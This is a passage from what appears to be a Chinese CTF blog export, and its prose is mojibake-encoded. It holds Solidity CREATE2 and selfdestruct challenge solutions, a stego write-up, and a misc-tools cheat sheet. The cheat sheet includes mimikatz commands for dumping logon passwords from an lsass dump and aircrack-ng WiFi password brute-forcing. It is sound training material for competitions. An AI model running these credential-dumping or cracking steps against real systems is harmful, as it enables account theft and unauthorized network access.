çš„éªšæ“ä½œ,éƒ¨ç½²ä¸€ä¸ªåˆçº¦ 0x33ff ,å³ selfdestruct(msg.sender) è°ƒç”¨ check() ,è®© target ä¸ºæˆ‘ä»¬éƒ¨ç½²çš„åˆçº¦åœ°å€ ç»™æˆ‘ä»¬éƒ¨ç½²çš„åˆçº¦å‘ä¸€ç¬”ç©ºäº¤æ˜“,è®©å®ƒè‡ªæ¯ å†æ¬¡ä½¿ç”¨ create2 éªšæ“ä½œ,åœ¨åŒä¸€ä¸ªåœ°å€éƒ¨ç½²åˆçº¦,åˆçº¦å†…å®¹ä¸º emit SendFlag(0) è°ƒç”¨ execute() ,å°±ä¼šæ‰§è¡Œæˆ‘ä»¬ç¬¬äºŒæ¬¡éƒ¨ç½²çš„åˆçº¦çš„ emit SendFlag äº‹ä»¶,å› ä¸ºæ˜¯ delegatecall æ“ä½œ,æ‰€ä»¥è¿˜æ˜¯ç›¸å½“äºŽåœ¨åŽŸé¢˜ç›®åˆçº¦ä¸­è¿›è¡Œçš„ emit SendFlag æ“ä½œ,æˆåŠŸ! Solution å…ˆå°† Deployer éƒ¨ç½²,åœ°å€ä¸º 0x307FdF03B1842A501F52221e4cF02D67BfeEc399 , ç„¶åŽä½¿ç”¨ Deployer.deploy éƒ¨ç½² 0x33ff ,å¾—åˆ°éƒ¨ç½²çš„åˆçº¦åœ°å€ 0x2b473f517088f6d08e82cA06dD5A5e6A68Eb4663 è°ƒç”¨ check() , target å·²ç»å˜æˆäº†æˆ‘ä»¬éƒ¨ç½²çš„åˆçº¦åœ°å€ ç»™æˆ‘ä»¬éƒ¨ç½²çš„åˆçº¦å‘ä¸€ç¬”ç©ºäº¤æ˜“,è®©å®ƒè‡ªæ¯,ç›®çš„æ˜¯ä¸ºäº†é‡æ–°åœ¨è¿™ä¸ªåœ°å€éƒ¨ç½²åˆçº¦è§¦å‘ SendFlag äº‹ä»¶,å¯ä»¥çœ‹åˆ°éƒ¨ç½²çš„åˆçº¦å·²ç»è‡ªæ¯ 1web3.eth.sendTransaction(&#123; from: &apos;0x785a8D0d84ad29c96f8e1F26BfDb3E6CB72cAe9b&apos;, to: &quot;0x2b473f517088f6d08e82cA06dD5A5e6A68Eb4663&quot;, data: &quot;&quot; &#125;, function(err,res)&#123;console.log(res)&#125;); ä½¿ç”¨ create2 éªšæ“ä½œ,åœ¨åŒä¸€ä¸ªåœ°å€éƒ¨ç½²åˆçº¦,åˆçº¦å†…å®¹ä¸º emit SendFlag(0) ,è¿™é‡Œæˆ‘æ˜¯å†™äº†ä¸€ä¸ª hack åˆçº¦,ç„¶åŽä½¿ç”¨ Deployer.deploy éƒ¨ç½² 123456contract hack &#123; event SendFlag(address addr); constructor() public &#123; emit SendFlag(address(0)); &#125;&#125; è¿™æ ·å°±æŠŠå†…å®¹ä¸º emit SendFlag çš„ hack åˆçº¦ç»™éƒ¨ç½²åˆ°åŒä¸€ä¸ªåœ°å€ 0x2b473f517088f6d08e82cA06dD5A5e6A68Eb4663 ä¸Šäº†,å¦‚ä¸‹å›¾ è°ƒç”¨ execute() ,å°±ä¼šæ‰§è¡Œæˆ‘ä»¬ç¬¬äºŒæ¬¡éƒ¨ç½²çš„åˆçº¦çš„ emit SendFlag äº‹ä»¶ å®Œç»“!!!ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>balsn2019</tag>
        <tag>create2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[misc_tools]]></title>
    <url>%2F2020%2Fmisc-tools%2F</url>
    <content type="text"><![CDATA[å‰è¨€ æœ¬æ–‡åŒ…å«åœ¨ windows å’Œåœ¨ kali ä¸‹ä½¿ç”¨çš„å·¥å…· è½¬è½½è‡ª Ga1@xy miscå·¥å…· å›¾ç‰‡ç›¸å…³jpgf5-steganography ï¼ˆF5éšå†™+éœ€è¦passwdï¼‰ å®‰è£… 1git clone https://github.com/matthewgao/F5-steganography ä½¿ç”¨: è¿›å…¥ F5-steganography æ–‡ä»¶å¤¹ 12java Extract 1.jpg -p 123456// -påŽæŽ¥f5çš„key outguess (å›¾ç‰‡éšå†™) å®‰è£… 123git clone https://github.com/crorvick/outguesscd outguess./configure &amp;&amp; make &amp;&amp; make install åŠ å¯† 1234outguess -k 12345 -d hidden.txt 1.jpg 2.jpg// -kåŽæŽ¥å¯†ç // -dåŽæŽ¥è¦éšè—çš„å†…å®¹// åŠ å¯†åŽ1.jpgä¼šè¦†ç›–2.jpg è§£å¯† 1234outguess -k 12345 -r 2.jpg out.txt// out.txt ä¸­å†…å®¹å³ä¸ºæƒ³è¦éšè—çš„ hidden.txt ä¸­å†…å®¹// ä¹Ÿå¯ä¸éœ€è¦å¯†ç outguess -r 2.jpg out.txt stegdetectï¼ˆæ£€æŸ¥jpgå›¾ç‰‡éšå†™æ–¹æ³•_winï¼‰12345678stegdetect.exe -tjopi -s 10.0 [stego_file]-s ä¿®æ”¹æ£€æµ‹ç®—æ³•çš„æ•æ„Ÿåº¦ï¼Œè¯¥å€¼çš„é»˜è®¤å€¼ä¸º1ã€‚æ£€æµ‹ç»“æžœçš„åŒ¹é…åº¦ä¸Žæ£€æµ‹ç®—æ³•çš„æ•æ„Ÿåº¦æˆæ­£æ¯”ï¼Œç®—æ³•æ•æ„Ÿåº¦çš„å€¼è¶Šå¤§ï¼Œæ£€æµ‹å‡ºçš„å¯ç–‘æ–‡ä»¶åŒ…å«æ•æ„Ÿä¿¡æ¯çš„å¯èƒ½æ€§è¶Šå¤§ã€‚-t è®¾ç½®è¦æ£€æµ‹å“ªäº›éšå†™å·¥å…·ï¼ˆé»˜è®¤æ£€æµ‹jopiï¼‰ï¼Œå¯è®¾ç½®çš„é€‰é¡¹å¦‚ä¸‹ï¼šj æ£€æµ‹å›¾åƒä¸­çš„ä¿¡æ¯æ˜¯å¦æ˜¯ç”¨jstegåµŒå…¥çš„ã€‚o æ£€æµ‹å›¾åƒä¸­çš„ä¿¡æ¯æ˜¯å¦æ˜¯ç”¨outguessåµŒå…¥çš„ã€‚p æ£€æµ‹å›¾åƒä¸­çš„ä¿¡æ¯æ˜¯å¦æ˜¯ç”¨jphideåµŒå…¥çš„ã€‚i æ£€æµ‹å›¾åƒä¸­çš„ä¿¡æ¯æ˜¯å¦æ˜¯ç”¨invisible secretsåµŒå…¥çš„ã€‚ å¦‚æžœæ˜¾ç¤ºä¸º [stego_file]ï¼šjphide(***)ï¼Œåˆ™å¯ä»¥ç”¨ stegbreak ç ´è§£å¯†ç  1stegbreak -r rules.ini -f password.txt -t p [stego_file] jphide å¯ä½¿ç”¨å·¥å…· JPHS steghide (å›¾ç‰‡æˆ–éŸ³é¢‘éšè—æ–‡ä»¶) å®‰è£… 1apt-get install steghide åŠ å¯† 1steghide embed -cf out.jpg -ef flag.txt [-p 123456] # -påŽæŽ¥å¯†ç ï¼Œå¯æ—  è§£å¯† 123456// æŸ¥çœ‹å›¾ç‰‡ä¸­åµŒå…¥çš„æ–‡ä»¶ä¿¡æ¯:steghide info out.jpg// æå–å«æœ‰å¯†ç çš„éšè—å†…å®¹:steghide extract -sf out.jpg -p 123456// æå–ä¸å«æœ‰å¯†ç çš„éšè—å†…å®¹:steghide extract -sf out.jpg steghide çˆ†ç ´å¯†ç  æœ‰äº›é¢˜ç›®ç”¨steghideåŠ å¯†æ–‡ä»¶ä½†æ˜¯ä¸ç»™å¯†ç ï¼Œæ­¤æ—¶å°±éœ€è¦çˆ†ç ´ï¼Œsteghide æœ¬èº«å¹¶ä¸æ”¯æŒçˆ†ç ´ï¼Œéœ€è¦ä¸€äº›å…¶ä»–çš„æ–¹æ³•ï¼šhttps://github.com/Va5c0/Steghide-Brute-Force-Tool 123python steg_brute.py -b -d [å­—å…¸] -f [jpg_file]// éœ€è¦å®‰è£…çš„åº“: progressbarpip install progressbar2 png &amp; bmpBlindWaterMark ï¼ˆç›²æ°´å°ï¼‰ç¬¬ä¸€ç§ æ­£å¸¸çš„bwm å®‰è£… åœ¨githubä¸Šä¸‹è½½è„šæœ¬ bwm.py ï¼ˆç½‘å€ï¼š https://github.com/chishaxie/BlindWaterMark ï¼‰ 123// å®‰è£…pythonå‰ç½®æ¨¡å—pip install -i https://pypi.tuna.tsinghua.edu.cn/simple opencv-pythonsudo pip install matplotlib åŠ å¯† 1234python bwm.py encode 1.png water.png 2.png// 1.png ä¸ºæ— æ°´å°åŽŸå›¾// water.png ä¸ºæ°´å°å›¾// 2.png ä¸ºæœ‰ç›²æ°´å°å›¾ è§£å¯† 1234python bwm.py decode 1.png 2.png flag.png// 1.png ä¸ºæ— æ°´å°åŽŸå›¾// 2.png ä¸ºæœ‰ç›²æ°´å°çš„å›¾// flag.png ä¸ºè§£å‡ºæ¥çš„å›¾ç‰‡ ç¬¬äºŒç§ é¢‘åŸŸç›²æ°´å°1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import cv2import numpy as npimport randomimport osfrom argparse import ArgumentParserALPHA = 5def build_parser(): parser = ArgumentParser() parser.add_argument(&apos;--original&apos;, dest=&apos;ori&apos;, required=True) parser.add_argument(&apos;--image&apos;, dest=&apos;img&apos;, required=True) parser.add_argument(&apos;--result&apos;, dest=&apos;res&apos;, required=True) parser.add_argument(&apos;--alpha&apos;, dest=&apos;alpha&apos;, default=ALPHA) return parserdef main(): parser = build_parser() options = parser.parse_args() ori = options.ori img = options.img res = options.res alpha = options.alpha if not os.path.isfile(ori): parser.error(&quot;original image %s does not exist.&quot; % ori) if not os.path.isfile(img): parser.error(&quot;image %s does not exist.&quot; % img) decode(ori, img, res, alpha)def decode(ori_path, img_path, res_path, alpha): ori = cv2.imread(ori_path) img = cv2.imread(img_path) ori_f = np.fft.fft2(ori) img_f = np.fft.fft2(img) height, width = ori.shape[0], ori.shape[1] watermark = (ori_f - img_f) / alpha watermark = np.real(watermark) res = np.zeros(watermark.shape) random.seed(height + width) x = range(height / 2) y = range(width) random.shuffle(x) random.shuffle(y) for i in range(height / 2): for j in range(width): res[x[i]][y[j]] = watermark[i][j] cv2.imwrite(res_path, res, [int(cv2.IMWRITE_JPEG_QUALITY), 100])if __name__ == &apos;__main__&apos;: main()// python pinyubwm.py --original 1.png --image 2.png --result out.png// æŸ¥çœ‹ out.png å³å¯ï¼Œå¦‚æžœæ— æ³•å¾—åˆ°æ­£å¸¸å›¾ç‰‡ï¼Œå¯å°† 1.png å’Œ 2.png è°ƒæ¢ä½ç½®å†æ¬¡å°è¯• lsbçš„pyè„šæœ¬è§£å¯†ï¼ˆlsbéšå†™+éœ€è¦passwdï¼‰ ä¸‹è½½ï¼š https://github.com/livz/cloacked-pixel ç®€å•ä½¿ç”¨å¦‚ä¸‹,å…¶ä½™è¯¦è§: https://github.com/livz/cloacked-pixel 1python lsb.py extract [stego_file] [out_file] [password] zsteg (lsbéšå†™)123gem install zstegzsteg 1.bmp// ä¸€èˆ¬æ¥è®²ç”¨ zsteg è§£å¯†çš„æ–‡ä»¶éƒ½ä¸º bmp æ–‡ä»¶ pngcheckï¼ˆæ£€æŸ¥IDATå—_winï¼‰1pngcheck.exe -v 123.png å¯æ£€æŸ¥ png çš„ IDAT å—æ˜¯å¦æœ‰é—®é¢˜ ç›¸å…³é¢˜ç›®å¯å‚è€ƒï¼šhttps://blog.csdn.net/u010391191/article/details/80818785 æœ‰å…³è§£é¢˜è„šæœ¬å¯å‚è€ƒ FzWjScJ å¸ˆå‚…çš„ blog ï¼šhttp://www.fzwjscj.xyz/index.php/archives/17/ WebP å®‰è£… (kali) 1apt install webp cwebp - ç¼–ç å™¨å·¥å…·ï¼šå¯å°† png è½¬ä¸º webp 1cwebp 1.png -o 2.webp dwebp - è§£ç å™¨å·¥å…·ï¼šå¯å°† webp è½¬ä¸º png 1dwebp 1.webp -o 2.png vwebp - æŸ¥çœ‹å™¨å·¥å…·ï¼šå¯ç›´æŽ¥æŸ¥çœ‹ webp æ ¼å¼å›¾ç‰‡ 1vwebp 1.webp webpinfo - æ ¼å¼æŸ¥çœ‹å·¥å…·ï¼šå¯æ‰“å°å‡º WebP æ–‡ä»¶çš„å—çº§ç»“æž„ä»¥åŠåŸºæœ¬å®Œæ•´æ€§æ£€æŸ¥ 1webpinfo 1.webp å…¶ä½™ï¼ˆ gif2webpã€img2webp ç­‰å¯è§ å®˜æ–¹æ–‡æ¡£ ï¼‰ exiftoolï¼ˆæŸ¥çœ‹å›¾ç‰‡exifä¿¡æ¯ï¼‰ å®‰è£… (kali) 1apt-get install exiftool ä½¿ç”¨ 1234exiftool 1.jpg // æ˜¾ç¤ºå›¾ç‰‡æ‰€æœ‰ä¿¡æ¯exiftool 1.jpg | grep flag // æŸ¥çœ‹å›¾ç‰‡æœ‰å…³â€˜flagâ€™å­—ç¬¦çš„ä¿¡æ¯exiftool * // æŸ¥çœ‹æ­¤æ–‡ä»¶å¤¹æ‰€æœ‰å›¾ç‰‡ä¿¡æ¯exiftool -b -ThumbnailImage attachment.jpg &gt;flag.jpg stegpyï¼ˆæ”¯æŒå¤šç§æ–‡ä»¶åŠ å¯†ï¼‰ æ­¤ç§åŠ å¯†æ”¯æŒå¯¹PNGã€BMPã€GIFã€WebPå’ŒWAVæ ¼å¼åŠ å¯†ï¼ŒåŒæ—¶å¯ä»¥é€‰æ‹©æœ‰æ— password å®‰è£… (kali) 1pip3 install stegpy åŠ å¯† ä¸å«æœ‰å¯†ç  1stegpy &apos;hello_world&apos; image.png - å«æœ‰å¯†ç  123stegpy &quot;hello_world&quot; image.png -pEnter password (will not be echoed): // è¾“å…¥å¯†ç ï¼ˆä¸æ˜¾ç¤ºï¼‰Verify password (will not be echoed): // ç¡®è®¤å¯†ç ï¼ˆä¸æ˜¾ç¤ºï¼‰ è§£å¯† ä¸å«æœ‰å¯†ç  1stegpy _image.png - å«æœ‰å¯†ç  12stegpy _image.png -pEnter password (will not be echoed): // è¾“å…¥å¯†ç ï¼ˆä¸æ˜¾ç¤ºï¼‰ åŽ‹ç¼©åŒ…ç›¸å…³crcå€¼çˆ†ç ´ (zipåŒ…ç¢°æ’žcrcå€¼) ä¸‹è½½è„šæœ¬ï¼šhttps://github.com/theonlypwner/crc32 1python crc32.py reverse ä½ çš„crc32å¯†æ–‡ åŽ‹ç¼©åŒ…å¯†ç çˆ†ç ´ Fcrackzip ARCHPR å¯å‚è€ƒ https://ctf-wiki.github.io/ctf-wiki/misc/archive/zip-zh/#_3 ZipCenOpï¼ˆzipä¼ªåŠ å¯†ï¼‰ åŠ å¯† 1java -jar ZipCenOp.jar e xxx.zip è§£å¯† 1java -jar ZipCenOp.jar r xxx.zip pycæ–‡ä»¶ç›¸å…³uncompyle6ï¼ˆpycæ–‡ä»¶åç¼–è¯‘ï¼‰12pip install uncompyle6uncompyle6 test.pyc &gt; test.py Stegosaurusï¼ˆpycéšå†™_winï¼‰12// ç‰ˆæœ¬ï¼šPython 3.6 or laterpython stegosaurus.py -x [pyc_file] éŸ³é¢‘ç›¸å…³MP3stegoï¼ˆMP3éšå†™_winï¼‰1...\Decode.exe -X -P [password] [stego_mp3] steghideï¼ˆå›¾ç‰‡æˆ–éŸ³é¢‘éšè—æ–‡ä»¶ï¼‰ å®‰è£…ï¼ˆkaliä¸­ï¼‰ 1apt-get install steghide åŠ å¯† 12steghide embed -cf out.jpg -ef flag.txt [-p 123456]// -påŽæŽ¥å¯†ç ï¼Œå¯æ—  è§£å¯† 123456// æŸ¥çœ‹å›¾ç‰‡ä¸­åµŒå…¥çš„æ–‡ä»¶ä¿¡æ¯ï¼šsteghide info out.jpg// æå–å«æœ‰å¯†ç çš„éšè—å†…å®¹ï¼šsteghide extract -sf out.jpg -p 123456// æå–ä¸å«æœ‰å¯†ç çš„éšè—å†…å®¹ï¼šsteghide extract -sf out.jpg steghideçˆ†ç ´å¯†ç  æœ‰äº›é¢˜ç›®ç”¨steghideåŠ å¯†æ–‡ä»¶ä½†æ˜¯ä¸ç»™å¯†ç ï¼Œæ­¤æ—¶å°±éœ€è¦çˆ†ç ´ï¼Œsteghideæœ¬èº«å¹¶ä¸æ”¯æŒçˆ†ç ´ï¼Œéœ€è¦ä¸€äº›å…¶ä»–çš„æ–¹æ³•ï¼šhttps://github.com/Va5c0/Steghide-Brute-Force-Tool 123python steg_brute.py -b -d [å­—å…¸] -f [jpg_file]// éœ€è¦å®‰è£…çš„åº“ï¼šprogressbarpip install progressbar2 å…¶å®ƒaircrack-ngï¼ˆçˆ†ç ´wifiå¯†ç ï¼‰ kaliä¸‹è‡ªå¸¦æœ‰ä¸€ä»½æ— çº¿å¯†ç å­—å…¸ï¼š/usr/share/wordlists/rockyou.txt.gzï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶è§£åŽ‹ 12345cd /usr/share/wordlists/rockyou.txt.gzgzip -d rockyou.txt.gzaircrack-ng -w /usr/share/wordlists/rockyou.txt -b [MAC] [capfile]// -w åŽåŠ å­—å…¸çš„ä½ç½®ï¼ˆkaliä¸­è‡ªå¸¦å­—å…¸çš„ä½ç½®ï¼‰// -b åŽåŠ è·¯ç”±å™¨çš„MACåœ°å€ï¼ˆåº”è¯¥ä¹Ÿå°±æ˜¯ BSSIDï¼‰ xortoolï¼ˆçŒœæµ‹xoråŠ å¯†çš„å¯†ç é•¿åº¦åŠå€¼ï¼‰ è¿™é‡Œåªåˆ—å‡ºäº†æœ€ç®€å•çš„ä½¿ç”¨æ–¹æ³•ï¼Œå…¶ä½™å¯è§ï¼šhttps://pypi.org/project/xortool/ 123xortool (-x) -c 20 123.txt// -xï¼šä»£è¡¨æ–‡ä»¶å†…å®¹ä¸ºåå…­è¿›åˆ¶// -cï¼šåŽåŠ å‡ºçŽ°é¢‘çŽ‡æœ€é«˜çš„å­—ç¬¦ï¼Œæ–‡æœ¬å†…å®¹ä¸€èˆ¬æ˜¯ç©ºæ ¼ï¼ˆ20ï¼‰ï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶ä¸€èˆ¬æ˜¯00 mimikatzï¼ˆæŠ“å–lsasså¯†ç ï¼‰ å‚è€ƒ: ä»‹ç»ä¸€ä¸‹ç¥žå™¨mimikatzï¼Œä»Žlsassé‡ŒæŠ“å¯†ç  | Jarettâ€™s Blog ä¸‹è½½ï¼šhttps://pan.baidu.com/s/1qZmnPar-gfqT9OaWO_DS3g æå–ç  svp9 å°† lsass.dmp æ–‡ä»¶æ”¾åœ¨ mimikatz.exe æ‰€åœ¨ç›®å½•ä¸‹ï¼Œå…³é—­æ€è½¯åŽæ‰“å¼€ mimikatz.exe , æ‰§è¡Œä»¥ä¸‹ä¸‰æ¡å‘½ä»¤ï¼š 123privilege::debugsekurlsa::minidump lsass.dmpsekurlsa::logonpasswords full gaps (æ‹¼å›¾) å®‰è£… 12345git clone https://github.com/nemanja-m/gaps.gitcd gaps pip install -r requirements.txtsudo apt-get install python-tkpip install -e . åˆ›å»ºæ‹¼å›¾ å¾—åˆ°çš„æ‹¼å›¾æ‰€æœ‰å›¾åœ¨ä¸€å¼ å¤§å›¾ä¸Šï¼Œå¯ä»¥é…åˆ convert å‘½ä»¤å°†å…¶åˆ‡å¼€ 1create_puzzle [å›¾ç‰‡ç»åº¦è·¯å¾„] --size=[å°ºå¯¸] --destination=[åˆ›å»ºæ‹¼å›¾åç§°] è¿˜åŽŸæ‹¼å›¾ å¦‚æžœè¿˜åŽŸçš„æ˜¯è¢«åˆ‡å¼€æˆä¸€å°å—ä¸€å°å—çš„æ‹¼å›¾ï¼Œéœ€è¦å…ˆå°†å…¶æ‹¼åœ¨ä¸€å¼ å¤§å›¾ä¸Šï¼ˆå¯ç”¨ montage å‘½ä»¤ï¼‰ï¼Œä¹‹åŽå†ç”¨ gaps å°†å…¶è¿˜åŽŸï¼š 12345678gaps --image=out.jpg --generations=50 --population=120 --size=50--image æŒ‡å‘æ‹¼å›¾çš„è·¯å¾„--size æ‹¼å›¾å—çš„åƒç´ å°ºå¯¸--generations é—ä¼ ç®—æ³•çš„ä»£çš„æ•°é‡--population ä¸ªä½“æ•°é‡--verbose æ¯ä¸€ä»£è®­ç»ƒç»“æŸåŽå±•ç¤ºæœ€ä½³ç»“æžœ--save å°†æ‹¼å›¾è¿˜åŽŸä¸ºå›¾åƒ dtmf2numï¼ˆç”µè¯éŸ³è§£ç ï¼‰ windows ä¸‹æœ‰ ä¹Ÿæœ‰ python è„šæœ¬: https://github.com/hfeeki/dtmf]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>tools</tag>
        <tag>kali</tag>
        <tag>win</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GKCTF2020 Harley Quinn]]></title>
    <url>%2F2020%2FHarley-Quinn%2F</url>
    <content type="text"><![CDATA[å‰è¨€ æ‰“äº†ä¸€å¤©çš„ GKCTF2020 ,ä¸Šé¢çš„å›¾åŽé¢å‡ é“æ˜¯åŽæ¥æ ¹æ® å®˜æ–¹WP å¤çŽ°çš„, æå–ç : du34 ç«Ÿç„¶æŠŠ crypto ç»™ AK äº†,å‡ºé¢˜äººé¢˜ç›®å‡ºç®€å•äº†,ä¸ç„¶æˆ‘ä¸€é“ä¹Ÿåšä¸å‡ºæ¥,å®³,å…¶å®ƒé¢˜ç›®ä¹Ÿåšä¸åŠ¨ misc ä¹Ÿåšå‡ºæ¥ä¸€é“,ä»…ä»¥æ­¤è®°å½•ä¸€ä¸‹ é™„ä»¶ https://pan.baidu.com/s/14bITFhiiPysPMFZTqzYKYA å¯†ç : tn6x Solutions è§£åŽ‹åŽ‹ç¼©åŒ…å¾—åˆ° .wav å’Œ .jpeg æ–‡ä»¶ ç”¨ Audacity åˆ†æž wav æ–‡ä»¶,åœ¨é¢‘è°±æœ«å°¾æ‰¾åˆ°ä¸‹é¢ä¸€æ®µ DTMF æ‹¨å·,ç”¨ dtmf2num.exe å·¥å…·è¯†åˆ«åŠ ä¸Šäººå·¥æ¯”å¯¹ä¿®æ”¹,æœ€åŽå¾—åˆ° #222833344477773338866# è¿™ä¸²ä¸œè¥¿, æŸ¥é˜…èµ„æ–™ ctf-wiki ,æ‰‹æœºé”®ç›˜å¯†ç ,æ¯”å¦‚ 222 å¯¹åº”çš„å°±æ˜¯ 23 ,æ˜¯ c å­—æ¯,ä¾æ¬¡ç±»æŽ¨,æœ€åŽå¾—åˆ° #ctfisfun# ç„¶åŽå¡ä½äº†,è¿‡äº†å¥½ä¹…,é¢˜ç›®æ”¾å‡º hint : FreeFileCamouflage ,ç„¶åŽå›žè¿‡å¤´åŽ»æŸ¥çœ‹åŽ‹ç¼©åŒ…æ³¨é‡Š,ä¹Ÿæœ‰è¿™æ ·ä¸€æ®µè¯,è™½ç„¶å¼€å¤´æ˜¯ä¹±ç  æŸ¥é˜…èµ„æ–™,å‘çŽ° FreeFileCamouflage æ˜¯ä¸€æ¬¾å°†é‡è¦æ–‡æ¡£ä»¥ AES åŠ å¯†ç®—æ³•å­˜æ”¾åˆ° JPG æ ¼å¼çš„å›¾ç‰‡ä¸­,äºŽæ˜¯å¼€å§‹ä¸‹è½½ä½¿ç”¨å¦‚ä¸‹, passwd å°±æ˜¯ä¹‹å‰å¾—åˆ°çš„ ctfisfun å¾—åˆ°ä¸€ä¸ª flag.txt æ–‡ä»¶: flag{Pudd1n!!_y0u_F1nd_m3!}]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>GKCTF2020</tag>
        <tag>Harley Quinn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Create2]]></title>
    <url>%2F2020%2FCreate2%2F</url>
    <content type="text"><![CDATA[å‰è¨€ æ™ºèƒ½åˆçº¦ç”Ÿæˆåˆçº¦åœ°å€çš„ç¬¬äºŒç§æ–¹å¼ Create2 ä»¥ä¸€é“ä¾‹é¢˜è§£é‡Š è®¡ç®—åœ°å€æœ‰ä¸¤ç§æ–¹å¼ Create : keccak256(rlp.encode(deployingAddress, nonce))[12:] Create2 : keccak256(0xff ++ deployingAddr ++ salt ++ keccak256(bytecode))[12:] å…³äºŽ Create2 ,è¿™é‡Œå°±ä¸ä»‹ç»äº†,å¯ä»¥å‚è€ƒ EIP 1014: CREATE2 æŒ‡ä»¤ 123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.21;interface IName &#123; function name() external view returns (bytes32);&#125;contract FuzzyIdentityChallenge &#123; bool public isComplete; function authenticate() public &#123; require(isSmarx(msg.sender)); require(isBadCode(msg.sender)); isComplete = true; &#125; function isSmarx(address addr) internal view returns (bool) &#123; return IName(addr).name() == bytes32("smarx"); &#125; function isBadCode(address _addr) internal pure returns (bool) &#123; bytes20 addr = bytes20(_addr); bytes20 id = hex"000000000000000000000000000000000badc0de"; bytes20 mask = hex"000000000000000000000000000000000fffffff"; for (uint256 i = 0; i &lt; 34; i++) &#123; if (addr &amp; mask == id) &#123; return true; &#125; mask &lt;&lt;= 4; id &lt;&lt;= 4; &#125; return false; &#125;&#125; å¾ˆç®€å•,è¦æ±‚ name æ˜¯ smarx ,å¹¶ä¸” msg.sender åŒ…å« badc0de ,å¯é€šè¿‡ä¸‹é¢åˆçº¦è§£å†³,åªéœ€è¦åˆçº¦åœ°å€åŒ…æ‹¬ badc0de å³å¯ 123456789pragma solidity ^0.5.12;contract BadCodeSmarx is IName &#123; function callAuthenticate(address _challenge) public &#123; FuzzyIdentityChallenge(_challenge).authenticate(); &#125; function name() external view returns (bytes32) &#123; return bytes32("smarx"); &#125;&#125; ç”¨ Create2 æ–¹æ³•è§£å†³,å¦‚ä¸‹,æˆ‘ä»¬åªéœ€è¦è®¡ç®—å‡ºç›¸å¯¹åº”çš„ salt å³å¯, Deployer è¢«éƒ¨ç½²åœ¨ 0xca4dfd86a86c48c5d9c228bedbeb7f218a29c94b 12345678910111213contract Deployer &#123; // contractBytecodeæ˜¯å¾…éƒ¨ç½²åˆçº¦çš„bytecode bytes contractBytecode = hex"608060405234801561001057600080fd5b5061015d806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806306fdde031461003b5780637872ab4914610059575b600080fd5b61004361009d565b6040518082815260200191505060405180910390f35b61009b6004803603602081101561006f57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506100c5565b005b60007f736d617278000000000000000000000000000000000000000000000000000000905090565b8073ffffffffffffffffffffffffffffffffffffffff1663380c7a676040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561010d57600080fd5b505af1158015610121573d6000803e3d6000fd5b505050505056fea265627a7a72315820fb2fc7a07f0eebf799c680bb1526641d2d905c19393adf340a04e48c9b527de964736f6c634300050c0032"; function deploy(bytes32 salt) public &#123; bytes memory bytecode = contractBytecode; address addr; assembly &#123; addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt) &#125; &#125;&#125; å†™äº†ä¸€ä¸ªè„šæœ¬çˆ†ç ´ salt, åªè¦åŒ…å« badc0de å³å¯ 1234567891011121314151617from web3 import Web3s1 = '0xffca4dfd86a86c48c5d9c228bedbeb7f218a29c94b's3 = '4670da3f633e838c2746ca61c370ba3dbd257b86b28b78449f4185480e2aba51'i = 0while(1): salt = hex(i)[2:].rjust(64, '0') s = s1+salt+s3 hashed = Web3.sha3(hexstr=s) hashed_str = ''.join(['%02x' % b for b in hashed]) if 'badc0de' in hashed_str[24:]: print(salt,hashed_str) break i += 1 print(salt) ç»“æžœå¦‚ä¸‹ æœ€åŽè°ƒç”¨ Deployer.deploy(0x00...005b2bfe) å³å¯æŠŠ BadCodeSmarx åˆçº¦éƒ¨ç½²åˆ°åœ°å€ 0xa905a3922a4ebfbc7d257cecdb1df04a3badc0de ä¸Š ä¹Ÿæœ‰å¤§ä½¬é€šè¿‡ Create æ–¹å¼è§£å†³çš„,æœ‰å…´è¶£çš„å¯ä»¥å‚è€ƒ https://www.anquanke.com/post/id/154104#h3-11 , å¸¦ä½¬è‡ªè¡ŒéªŒè¯,æˆ‘æ²¡æœ‰éªŒè¯]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Create2</tag>
        <tag>Solidity</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[èœœç½åˆçº¦]]></title>
    <url>%2F2020%2FHoneypot-Contract%2F</url>
